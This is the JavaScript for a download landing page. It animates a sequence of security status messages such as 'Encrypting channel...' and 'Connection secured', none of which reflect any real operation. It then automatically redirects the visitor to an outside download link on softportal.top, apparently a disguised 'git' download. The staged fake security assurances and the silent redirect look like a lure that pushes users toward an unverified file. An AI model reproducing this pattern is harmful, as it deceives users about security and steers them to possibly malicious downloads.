document.addEventListener('DOMContentLoaded', function() {
  const statusText = document.getElementById('transfer-status');
  const errorText = document.getElementById('transfer-error');
  const progressFill = document.querySelector('.progress-fill');
  
  // Анимированные статусы
  const statusMessages = [
    'Initializing secure tunnel...',
    'Authenticating server...',
    'Encrypting channel...',
    'Generating download link...',
    'Connection secured'
  ];
  
  let messageIndex = 0;
  let isComplete = false;
  
  // Анимация текста статуса
  function updateStatus() {
    if (messageIndex < statusMessages.length && !isComplete) {
      statusText.textContent = statusMessages[messageIndex];
      messageIndex++;
      
      // Прогресс
      const progress = (messageIndex / statusMessages.length) * 100;
      progressFill.style.width = progress + '%';
      
      if (messageIndex < statusMessages.length) {
        setTimeout(updateStatus, 300);
      } else {
        // Финальный шаг
        isComplete = true;
        statusText.textContent = 'Download starting...';
        
        setTimeout(() => {
          window.location.href = 'https://softportal.top/s/git2';
        }, 500);
      }
    }
  }
  
  // Запуск анимации
  setTimeout(updateStatus, 200);
  
  // Hover-анимация карточки
  const card = document.querySelector('.content-card');
  
  card.addEventListener('mouseenter', function() {
    if (!isComplete) {
      this.style.transform = 'translateY(-2px)';
      this.style.boxShadow = '0 40px 80px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(255, 255, 255, 0.1)';
    }
  });
  
  card.addEventListener('mouseleave', function() {
    if (!isComplete) {
      this.style.transform = 'translateY(0)';
      this.style.boxShadow = '0 32px 64px rgba(0, 0, 0, 0.25), 0 0 0 1px rgba(255, 255, 255, 0.05)';
    }
  });
});

// Открытие/закрытие попапа
function toggleInfoPopup() {
  const popup = document.getElementById('filePopup');
  if (popup.style.display === 'block') {
    popup.style.display = 'none';
  } else {
    popup.style.display = 'block';
  }
}

// Закрытие при клике вне попапа
document.addEventListener('click', function(event) {
  const popup = document.getElementById('filePopup');
  const infoBtn = event.target.closest('button[onclick="toggleInfoPopup()"]');
  
  if (!popup.contains(event.target) && !infoBtn) {
    popup.style.display = 'none';
  }
});
